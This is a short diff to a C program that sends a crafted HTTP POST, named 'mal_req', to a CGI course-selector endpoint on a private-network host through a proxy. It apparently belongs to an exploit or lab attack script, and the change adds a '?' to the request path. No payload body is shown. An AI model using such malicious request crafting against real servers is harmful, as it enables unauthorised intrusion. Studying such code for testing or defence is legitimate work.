@@ -188,7 +188,7 @@ int32_t main() {
 
     _connect(sockfd, PROXY_ADDR, 8080);
 
-    const char mal_req[] = "POST /cgi-bin/course_selector HTTP/1.1\r\n"
+    const char mal_req[] = "POST /cgi-bin/course_selector? HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Content-Type: application/x-www-form-urlencoded\r\n"
         "Content-Length: 341\r\n"
